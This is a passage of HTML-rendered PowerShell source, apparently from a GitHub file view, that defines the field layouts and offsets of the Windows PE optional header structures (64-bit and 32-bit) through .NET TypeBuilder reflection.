          <td id="LC381" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>Architecture<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$IMAGE_DATA_DIRECTORY</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">168</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L382" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="382"></td>
          <td id="LC382" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>GlobalPtr<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$IMAGE_DATA_DIRECTORY</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">176</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L383" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="383"></td>
          <td id="LC383" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>TLSTable<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$IMAGE_DATA_DIRECTORY</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">184</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L384" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="384"></td>
          <td id="LC384" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>LoadConfigTable<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$IMAGE_DATA_DIRECTORY</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">192</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L385" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="385"></td>
          <td id="LC385" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>BoundImport<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$IMAGE_DATA_DIRECTORY</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">200</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L386" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="386"></td>
          <td id="LC386" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>IAT<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$IMAGE_DATA_DIRECTORY</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">208</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L387" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="387"></td>
          <td id="LC387" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>DelayImportDescriptor<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$IMAGE_DATA_DIRECTORY</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">216</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L388" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="388"></td>
          <td id="LC388" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>CLRRuntimeHeader<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$IMAGE_DATA_DIRECTORY</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">224</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L389" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="389"></td>
          <td id="LC389" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>Reserved<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$IMAGE_DATA_DIRECTORY</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">232</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L390" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="390"></td>
          <td id="LC390" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$IMAGE_OPTIONAL_HEADER64</span> <span class="pl-k">=</span> <span class="pl-smi">$TypeBuilder<span class="pl-smi">.CreateType</span></span>()</td>
        </tr>
        <tr>
          <td id="L391" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="391"></td>
          <td id="LC391" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Win32Types</span> <span class="pl-k">|</span> <span class="pl-c1">Add-Member</span> <span class="pl-k">-</span>MemberType NoteProperty <span class="pl-k">-</span>Name IMAGE_OPTIONAL_HEADER64 <span class="pl-k">-</span>Value <span class="pl-smi">$IMAGE_OPTIONAL_HEADER64</span></td>
        </tr>
        <tr>
          <td id="L392" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="392"></td>
          <td id="LC392" class="blob-code blob-code-inner js-file-line">
</td>
        </tr>
        <tr>
          <td id="L393" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="393"></td>
          <td id="LC393" class="blob-code blob-code-inner js-file-line">		<span class="pl-c"><span class="pl-c">#</span>Struct IMAGE_OPTIONAL_HEADER32</span></td>
        </tr>
        <tr>
          <td id="L394" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="394"></td>
          <td id="LC394" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$Attributes</span> <span class="pl-k">=</span> <span class="pl-s"><span class="pl-pds">&#39;</span>AutoLayout, AnsiClass, Class, Public, ExplicitLayout, Sealed, BeforeFieldInit<span class="pl-pds">&#39;</span></span></td>
        </tr>
        <tr>
          <td id="L395" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="395"></td>
          <td id="LC395" class="blob-code blob-code-inner js-file-line">		<span class="pl-smi">$TypeBuilder</span> <span class="pl-k">=</span> <span class="pl-smi">$ModuleBuilder<span class="pl-smi">.DefineType</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>IMAGE_OPTIONAL_HEADER32<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$Attributes</span><span class="pl-k">,</span> [<span class="pl-k">System.ValueType</span>]<span class="pl-k">,</span> <span class="pl-c1">224</span>)</td>
        </tr>
        <tr>
          <td id="L396" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="396"></td>
          <td id="LC396" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>Magic<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$MagicType</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">0</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L397" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="397"></td>
          <td id="LC397" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>MajorLinkerVersion<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">Byte</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">2</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L398" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="398"></td>
          <td id="LC398" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>MinorLinkerVersion<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">Byte</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">3</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L399" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="399"></td>
          <td id="LC399" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>SizeOfCode<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">4</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L400" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="400"></td>
          <td id="LC400" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>SizeOfInitializedData<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">8</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L401" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="401"></td>
          <td id="LC401" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>SizeOfUninitializedData<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">12</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L402" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="402"></td>
          <td id="LC402" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>AddressOfEntryPoint<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">16</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L403" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="403"></td>
          <td id="LC403" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>BaseOfCode<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">20</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L404" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="404"></td>
          <td id="LC404" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>BaseOfData<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">24</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L405" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="405"></td>
          <td id="LC405" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>ImageBase<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">28</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L406" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="406"></td>
          <td id="LC406" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>SectionAlignment<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">32</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L407" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="407"></td>
          <td id="LC407" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>FileAlignment<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">36</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L408" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="408"></td>
          <td id="LC408" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>MajorOperatingSystemVersion<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">40</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L409" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="409"></td>
          <td id="LC409" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>MinorOperatingSystemVersion<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">42</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L410" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="410"></td>
          <td id="LC410" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>MajorImageVersion<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">44</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L411" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="411"></td>
          <td id="LC411" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>MinorImageVersion<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">46</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L412" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="412"></td>
          <td id="LC412" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>MajorSubsystemVersion<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">48</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L413" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="413"></td>
          <td id="LC413" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>MinorSubsystemVersion<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt16</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">50</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L414" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="414"></td>
          <td id="LC414" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>Win32VersionValue<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">52</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L415" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="415"></td>
          <td id="LC415" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>SizeOfImage<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">56</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L416" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="416"></td>
          <td id="LC416" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>SizeOfHeaders<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">60</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L417" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="417"></td>
          <td id="LC417" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>CheckSum<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">64</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L418" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="418"></td>
          <td id="LC418" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>Subsystem<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$SubSystemType</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">68</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L419" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="419"></td>
          <td id="LC419" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>DllCharacteristics<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$DllCharacteristicsType</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">70</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L420" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="420"></td>
          <td id="LC420" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>SizeOfStackReserve<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">72</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L421" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="421"></td>
          <td id="LC421" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>SizeOfStackCommit<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">76</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L422" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="422"></td>
          <td id="LC422" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>SizeOfHeapReserve<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">80</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L423" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="423"></td>
          <td id="LC423" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>SizeOfHeapCommit<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">84</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L424" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="424"></td>
          <td id="LC424" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>LoaderFlags<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">88</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L425" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="425"></td>
          <td id="LC425" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>NumberOfRvaAndSizes<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> [<span class="pl-k">UInt32</span>]<span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">92</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L426" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="426"></td>
          <td id="LC426" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>ExportTable<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$IMAGE_DATA_DIRECTORY</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">96</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L427" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="427"></td>
          <td id="LC427" class="blob-code blob-code-inner js-file-line">		(<span class="pl-smi">$TypeBuilder<span class="pl-smi">.DefineField</span></span>(<span class="pl-s"><span class="pl-pds">&#39;</span>ImportTable<span class="pl-pds">&#39;</span></span><span class="pl-k">,</span> <span class="pl-smi">$IMAGE_DATA_DIRECTORY</span><span class="pl-k">,</span> <span class="pl-s"><span class="pl-pds">&#39;</span>Public<span class="pl-pds">&#39;</span></span>)).SetOffset(<span class="pl-c1">104</span>) <span class="pl-k">|</span> <span class="pl-c1">Out-Null</span></td>
        </tr>
        <tr>
          <td id="L428" class="blob-num js-line-number js-code-nav-line-number js-blob-rnum" data-line-number="428"></td>
